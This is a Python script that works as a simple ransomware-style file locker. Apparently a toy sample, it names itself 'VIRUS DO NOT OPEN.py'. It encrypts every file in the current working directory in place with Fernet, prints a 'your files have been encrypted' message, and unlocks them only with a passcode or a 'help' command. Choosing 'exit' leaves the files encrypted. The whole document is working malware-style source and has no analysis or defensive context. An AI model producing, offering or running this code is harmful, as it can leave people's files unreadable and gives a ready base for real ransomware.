import os
from cryptography.fernet import Fernet

def list_files():
    files = []
    for file in os.listdir():
        if file in ['VIRUS DO NOT OPEN.py', 'thekey.key','decrypt.py']:
            continue
        if os.path.isfile(file):
            files.append(file)
    return files

def encrypt_files(key):
    cipher = Fernet(key)
    for file in list_files():
        with open(file, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(file, 'wb') as f:
            f.write(encrypted)
    print("Your files have been encrypted!")
    print('Type "help" to unlock (decrypt) your files immediately, or "unlock" to enter your passcode.')

def decrypt_files(key):
    cipher = Fernet(key)
    for file in list_files():
        with open(file, 'rb') as f:
            data = f.read()
        decrypted = cipher.decrypt(data)
        with open(file, 'wb') as f:
            f.write(decrypted)
    print("Files decrypted successfully!")

def get_passcode():
    while True:
        passcode1 = input("Create a passcode to lock your files: ")
        passcode2 = input("Confirm your passcode: ")
        if passcode1 == passcode2:
            print(f"Passcode set! Your passcode is: {passcode1}. Keep it safe!")
            return passcode1
        else:
            print("Passcodes do not match. Please try again.\n")

def main():
    passcode = get_passcode()

    # Generate or load the key
    if not os.path.exists('thekey.key'):
        key = Fernet.generate_key()
        with open('thekey.key', 'wb') as keyfile:
            keyfile.write(key)
    else:
        with open('thekey.key', 'rb') as keyfile:
            key = keyfile.read()

    encrypt_files(key)

    while True:
        user_input = input("Enter command: ").lower()
        if user_input == "help":
            # Immediately decrypt files
            decrypt_files(key)
            break
        elif user_input == "unlock":
            attempt = input("Enter passcode to decrypt files: ")
            if attempt == passcode:
                decrypt_files(key)
                break
            else:
                print("Incorrect passcode. Try again.")
        elif user_input == "exit":
            print("Exiting program. Files remain encrypted.")
            break
        else:
            print("Unknown command. Type 'help', 'unlock', or 'exit'.")

if __name__ == '__main__':
    main()
